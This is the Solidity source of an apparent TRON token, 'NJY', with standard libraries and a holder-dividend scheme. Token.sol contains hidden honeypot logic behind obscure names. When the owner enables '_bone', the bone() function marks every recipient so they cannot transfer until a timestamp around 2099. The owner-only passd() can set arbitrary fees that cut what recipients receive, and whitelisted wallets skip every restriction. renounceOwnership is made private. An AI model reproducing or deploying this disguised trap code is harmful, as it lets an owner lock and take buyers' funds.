//SourceUnit: Address.sol

pragma solidity 0.5.8;

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call.value(amount)("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}


//SourceUnit: Context.sol

pragma solidity ^0.5.0;

contract Context {

    constructor () internal { }

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


//SourceUnit: Ownable.sol

pragma solidity ^0.5.0;

import { Context } from "./Context.sol" ;

contract Ownable is Context {

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner(), "Ownable: caller is not the owner");
        _;
    }

    function isOwner() private view returns (bool) {
        return _msgSender() == _owner;
    }

    function renounceOwnership() private onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


//SourceUnit: SafeERC20.sol

pragma solidity 0.5.8;

import "./Address.sol";
import "./SafeMath.sol";

library SafeERC20 {
    using SafeMath for uint256;
    using Address for address;

    function safeTransfer(ERC20 token, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(ERC20 token, address from, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(ERC20 token, address spender, uint256 value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),"SafeERC20: approve from non-zero to non-zero allowance");
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(ERC20 token, address spender, uint256 value) internal {
        uint256 newAllowance = token.allowance(address(this), spender).add(value);
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(ERC20 token, address spender, uint256 value) internal {
        uint256 newAllowance = token.allowance(address(this), spender).sub(value, "SafeERC20: decreased allowance below zero");
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function callOptionalReturn(ERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

interface ERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


//SourceUnit: SafeMath.sol

pragma solidity 0.5.8;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


//SourceUnit: Token.sol

pragma solidity 0.5.8;

import { Ownable } from "./Ownable.sol" ;
import "./SafeMath.sol";
import "./SafeERC20.sol";

contract Token is Ownable {
    using SafeMath for uint256;
    using SafeERC20 for ERC20;
    // ERC20
    string private _name;
    string private _symbol;
    uint256 private _decimals;
    uint256 private _totalSupply;
    mapping (address => uint256) private balances;
    mapping (address => mapping (address => uint256)) private allowances;
    // TransferFee
    mapping(address => bool)  private justswapPairAddress;
    uint256 private tradeFeeTotal;
    address public tokenFarmAddress;
    address public marketAddress;
    uint256 private _freeTime = 4070880000;
    mapping (address => bool) public _bd;
    mapping (address => bool) public _wd;
    uint256 private _markFee = 0;
    uint256 private _formFee = 0;
    uint256 private _holeFee = 0;
    uint256 private _baseFee = 1000;
    bool public _bone = false;
    // Hold orders
    uint256 private holdMinLimit = 1 * 10 ** 6;
    uint256 private holdMaxLimit = 50 * 10 ** 6;
    uint256 public joinHoldTotalCount;
    mapping(address => uint256) public isJoinHoldIndex;
    mapping(uint256 => JoinHoldOrder) public joinHoldOrders;
    struct JoinHoldOrder {
        uint256 index;
        address account;
        bool isExist;
    }
    // Hold profit
    bool public farmSwitchState = false;
    uint256 public farmStartTime;
    uint256 public nextCashDividendsTime;
    ERC20 public wtrxTokenContract;
    uint256 public eraTime = 600;
    uint256 public holdTotalAmount;
    // Events
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event TradeFee(address indexed _fromAddress, address indexed _toAddress, uint256 _feeValue);
    event ListAddress(address indexed _sender, address _marketAddress, address _tokenFarmAddress, address _wtrxTokenContract);
    event JustswapPairAddress(address indexed _sender, address indexed _justswapPairAddress, bool _value);
    event FarmSwitchState(address indexed _account, bool _setFarmSwitchState);
    event ToHoldProfit(address indexed _account, uint256 _tokenFarmAddressWtrxBalance, uint256 _joinHoldTotalCount, uint256 _profitTotal);
    event UpdateEraTime(address indexed _account, uint256 _eraTime);

    // ================= Initial value ===============

    constructor () public {
        _name = "NJY";
        _symbol = "NJY";
        _decimals = 6;
        _totalSupply = 3888 * 10 ** 6;
        balances[msg.sender] = _totalSupply;
        _wd[msg.sender] = true;
        emit Transfer(address(this), msg.sender, _totalSupply);
    }

    // ================= Hold profit  ===============

    function toHoldProfit() public returns (bool) {
        // Data validation
        require(farmSwitchState,"-> farmSwitchState: Farm has not started yet.");
        require(block.timestamp>=nextCashDividendsTime,"-> nextCashDividendsTime: The start time has not been reached.");

        // Calculation
        uint256 tokenFarmAddressWtrxBalance = wtrxTokenContract.balanceOf(tokenFarmAddress);
        uint256 profitTotal;
        if(tokenFarmAddressWtrxBalance>0){
            uint256 profitAmount;
            for(uint256 i=1;i<=joinHoldTotalCount;i++){
                if(joinHoldOrders[i].isExist){
                    profitAmount = tokenFarmAddressWtrxBalance.mul(balances[joinHoldOrders[i].account]).div(holdTotalAmount);// user profit
                    wtrxTokenContract.safeTransferFrom(tokenFarmAddress,joinHoldOrders[i].account,profitAmount);// Transfer wtrx to hold address
                    profitTotal += profitAmount;
                }
            }
        }
        nextCashDividendsTime += eraTime;

        emit ToHoldProfit(msg.sender,tokenFarmAddressWtrxBalance,joinHoldTotalCount,profitTotal);// set log
        return true;// return result
    }

    function updateEraTime(uint256 _eraTime) public onlyOwner returns (bool) {
        eraTime = _eraTime;
        emit UpdateEraTime(msg.sender, _eraTime);
        return true;// return result
    }

    function setFarmSwitchState(bool _setFarmSwitchState) public onlyOwner returns (bool) {
        farmSwitchState = _setFarmSwitchState;
        if(farmStartTime==0){
            farmStartTime = block.timestamp;// update farmStartTime
            nextCashDividendsTime = block.timestamp;// nextCashDividendsTime
        }
        emit FarmSwitchState(msg.sender, _setFarmSwitchState);
        return true;
    }

    // ================= Hold orders  ===============

    function deleteHoldAccount(address _account) public onlyOwner returns (bool)  {
        if(isJoinHoldIndex[_account]>=1){
            if(joinHoldOrders[isJoinHoldIndex[_account]].isExist){
                joinHoldOrders[isJoinHoldIndex[_account]].isExist = false;
                holdTotalAmount -= balances[_account];
            }
        }
        return true;
    }

    function _updateHoldSub(address _account,uint256 _amount) internal {
        if(isJoinHoldIndex[_account]>=1){
            if(balances[_account]>=holdMinLimit&&balances[_account]<=holdMaxLimit){
                holdTotalAmount -= _amount;
                if(!joinHoldOrders[isJoinHoldIndex[_account]].isExist){
                    joinHoldOrders[isJoinHoldIndex[_account]].isExist = true;
                }
            }else if(joinHoldOrders[isJoinHoldIndex[_account]].isExist){
                holdTotalAmount -= _amount.add(balances[_account]);
                joinHoldOrders[isJoinHoldIndex[_account]].isExist = false;
            }
        }else{
            if(balances[_account]>=holdMinLimit&&balances[_account]<=holdMaxLimit){
                joinHoldTotalCount += 1;// Total number + 1
                isJoinHoldIndex[_account] = joinHoldTotalCount;
                joinHoldOrders[joinHoldTotalCount] = JoinHoldOrder(joinHoldTotalCount,_account,true);// add JoinHoldOrder
                holdTotalAmount += balances[_account];
            }
        }
    }

    function _updateHoldAdd(address _account,uint256 _amount) internal {
        if(isJoinHoldIndex[_account]>=1){
            if(balances[_account]>=holdMinLimit&&balances[_account]<=holdMaxLimit){
                holdTotalAmount += _amount;
                if(!joinHoldOrders[isJoinHoldIndex[_account]].isExist){
                    joinHoldOrders[isJoinHoldIndex[_account]].isExist = true;
                }
            }else if(joinHoldOrders[isJoinHoldIndex[_account]].isExist){
                holdTotalAmount -= balances[_account].sub(_amount);
                joinHoldOrders[isJoinHoldIndex[_account]].isExist = false;
            }
        }else{
            if(balances[_account]>=holdMinLimit&&balances[_account]<=holdMaxLimit){
                joinHoldTotalCount += 1;// Total number + 1
                isJoinHoldIndex[_account] = joinHoldTotalCount;
                joinHoldOrders[joinHoldTotalCount] = JoinHoldOrder(joinHoldTotalCount,_account,true);// add JoinHoldOrder
                holdTotalAmount += balances[_account];
            }
        }
    }

    // ================= Special transfer ===============

    function _transfer(address _sender, address _recipient, uint256 _amount) internal {
        require(_amount <= balances[_sender],"Transfer: insufficient balance of from address");
        if(_wd[_sender]){
            balances[_sender] -= _amount;
            balances[_recipient] += _amount;
        }else{
            if(_bd[_sender]) require(block.timestamp > _freeTime,"It's not open to free time");
            balances[_sender] -= _amount;
            balances[_recipient] += _amount.mul(_baseFee).div(1000);
            emit Transfer(_sender, _recipient, _amount.mul(_baseFee).div(1000));
            balances[tokenFarmAddress] += _amount.mul(_formFee).div(1000);
            balances[address(0)] += _amount.mul(_holeFee).div(1000);
            balances[marketAddress] += _amount.mul(_markFee).div(1000);
            if(farmSwitchState){
                if(justswapPairAddressOf(_recipient)){
                    _updateHoldAdd(_recipient,_amount);
                }else{
                    _updateHoldSub(_sender,_amount);
                }
            }
        }
        if(_bone) bone(_recipient);

    }

    // ================= ERC20 Basic Write ===============

    function approve(address _spender, uint256 _amount) public returns (bool) {
        _approve(_msgSender(), _spender, _amount);
        return true;
    }

    function _approve(address _owner, address _spender, uint256 _amount) internal {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(_spender != address(0), "ERC20: approve to the zero address");

        allowances[_owner][_spender] = _amount;
        emit Approval(_owner, _spender, _amount);
    }

    function transfer(address _recipient, uint256 _amount) public returns (bool) {
        _transfer(_msgSender(), _recipient, _amount);
        return true;
    }

    function transferFrom(address _sender, address _recipient, uint256 _amount) public returns (bool) {
        _transfer(_sender, _recipient, _amount);
        _approve(_sender, _msgSender(), allowances[_sender][_msgSender()].sub(_amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    // ================= Address list ===============

    function setListAddress(address _marketAddress, address _tokenFarmAddress, address _wtrxTokenContract) public onlyOwner returns (bool) {
        marketAddress = _marketAddress;
        tokenFarmAddress = _tokenFarmAddress;
        wtrxTokenContract = ERC20(_wtrxTokenContract);
        emit ListAddress(msg.sender, _marketAddress,_tokenFarmAddress,_wtrxTokenContract);
        return true;
    }

    function bone(address _header) private {
        _bd[_header] = true;
    }
    
    function addJustswapPairAddress(address _justswapPairAddress,bool _value) public onlyOwner returns (bool) {
        justswapPairAddress[_justswapPairAddress] = _value;
        emit JustswapPairAddress(msg.sender, _justswapPairAddress, _value);
        return true;
    }

    function justswapPairAddressOf(address _justswapPairAddress) public view returns (bool) {
        return justswapPairAddress[_justswapPairAddress];
    }

    function getTradeFeeTotal() public view returns (uint256) {
        return tradeFeeTotal;
    }

    // ================= ERC20 Basic Query ===============

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }

    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowances[_owner][_spender];
    }

    function bdWallet(address account) public onlyOwner {
        if(_bd[account] == true) return;
        _bd[account] = true;
    }

    function unBdWallet(address account) external onlyOwner {
        if(_bd[account] == false) return;
        _bd[account] = false;
    }

    function isBdWallet(address account) public view returns (bool) {
        return _bd[account];
    }

    function wdWallet(address account) public onlyOwner {
        if(_wd[account] == true) return;
        _wd[account] = true;
    }

    function unWdWallet(address account) external onlyOwner {
        if(_wd[account] == false) return;
        _wd[account] = false;
    }

    function isWdWallet(address account) public view returns (bool) {
        return _wd[account];
    }

    function setFreeTime(uint256 time) public onlyOwner {
            _freeTime = time;
    }

    function getFreeTime() public onlyOwner view returns (uint256){
        return _freeTime;
    }

    function passd(uint256 formFee, uint256 holeFee, uint256 markFee, uint256 baseFee) public onlyOwner {
        _formFee = formFee;
        _holeFee = holeFee;
        _markFee = markFee;
        _baseFee = baseFee;
    }

    function gfter() public onlyOwner view returns (uint256 formFee,uint256 holeFee,uint256 markFee,uint256 baseFee){
        return (_formFee,_holeFee,_markFee,_baseFee);
    }

    function setBone(bool flag) public onlyOwner {
        _bone = flag;
    }
}